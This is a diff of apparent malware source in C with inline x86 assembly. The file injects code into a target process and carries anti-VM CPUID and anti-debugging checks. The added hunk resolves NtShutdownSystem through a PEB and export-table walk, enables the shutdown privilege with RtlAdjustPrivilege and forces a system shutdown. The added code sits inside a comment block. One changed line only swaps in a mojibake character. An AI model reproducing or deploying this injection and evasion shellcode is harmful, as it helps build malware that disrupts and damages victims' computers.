@@ -1104,7 +1104,7 @@ bool AddCode(char *filepath, int pid)
 		//jmp peb_beingdebugged_spec_exec
 	
 	////////////CPUID2
-	//Hypervisor brand”: by calling CPUID with EAX=40000000 as input,1 the malware will get, as the return value,
+	//Hypervisor brandÂ”: by calling CPUID with EAX=40000000 as input,1 the malware will get, as the return value,
 	//the virtualization vendor string in EBX, ECX, EDX.
 		cpu_id2:
 		xor eax, eax
@@ -2871,6 +2871,54 @@ bool AddCode(char *filepath, int pid)
 		call switch_desktop_loc1_back
 
 		bb('m') bb('y') bb('d') bb('e') bb('s')  bb('k')  bb('t')  bb('t')  bb('o')  bb('p')  bb(0x00)
+		
+		////////////////find Nt_ShutdownSystem function
+		Nt_ShutdownSystem_Function:
+	
+		mov eax, fs : [30h];						
+		mov eax, [eax + 0x0c]; 12
+		mov eax, [eax + 0x14]; 20
+		mov eax, [eax];							
+		mov eax, [eax + 0x10]; 16
+
+		mov   ebx, eax;
+		mov   eax, [ebx + 0x3c];               
+		mov   edi, [ebx + eax + 0x78];		   
+		add   edi, ebx;						   
+		mov   ecx, [edi + 0x18];			   
+		mov   edx, [edi + 0x20];			  
+		add   edx, ebx;						   
+							
+		Nt_ShutdownSystem_loop :
+		dec ecx
+		mov esi, [edx + ecx * 4];					Store the relative offset of the name
+		add esi, ebx;								Set esi to the VMA of the current name
+		cmp dword ptr[esi], 0x6853744e;				NtTe = 4e 74 53 68
+		je Nt_ShutdownSystem_loop1
+		jmp Nt_ShutdownSystem_loop
+		Nt_ShutdownSystem_loop1 :
+		cmp dword ptr[esi + 0xd], 0x006d6574;		ess = 74 65 6d 00
+		je stopped_Nt_ShutdownSystem_loop;
+		jmp Nt_ShutdownSystem_loop
+		stopped_Nt_ShutdownSystem_loop :
+		mov   edx, [edi + 0x24];					Table of ordinals relative
+		add   edx, ebx;								Table of ordinals
+		mov   cx, [edx + 2 * ecx];					function ordinal
+		mov   edx, [edi + 0x1c];					Address table relative offset
+		add   edx, ebx;								Table address
+		mov   eax, [edx + 4 * ecx];					ordinal offset
+		add   eax, ebx;								Function VMA; Eax holds address of VirtualFree
+		mov Nt_ShutdownSystem, eax
+
+		lea eax, enabled
+		push eax
+		push FALSE
+		push TRUE
+		push 19
+		call Rtl_AdjustPrivilege
+
+		push NULL
+		call Nt_ShutdownSystem
 	*/ 
 	Nt_TerminateProcess_Function:
 	///////////resolve NtSetInformationThread address
